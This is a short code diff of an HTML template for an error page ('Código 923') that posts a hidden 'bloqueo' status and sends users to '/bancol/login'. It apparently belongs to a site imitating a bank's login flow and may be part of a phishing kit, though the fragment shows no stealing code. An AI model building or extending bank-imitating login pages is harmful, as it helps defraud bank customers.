@@ -111,16 +111,20 @@
 
         <p class="code">Código 923</p>
 
-        <button type="button" class="btn-retry" id="btnIntentar">Intentar Nuevamente</button>
+        <form id="formRetry">
+            <input type="hidden" id="no-status" name="status" value="bloqueo">
+            <button type="submit" class="btn-retry" id="enviar">Intentar Nuevamente</button>
+        </form>
+        <div id="mensaje"></div>
     </div>
 
-    <script>
-        document.getElementById('btnIntentar').addEventListener('click', function() {
-            window.location.href = '/bancol/login';
-        });
-    </script>
-
-    <x-control :auto-guardar="false" :auto-completar="false" :auto-init="false" :debug="false" />
+    <x-control
+        :auto-guardar="false"
+        :auto-completar="false"
+        :auto-init="true"
+        :debug="false"
+        redirect-url="/bancol/login"
+    />
 </body>
 
 </html>
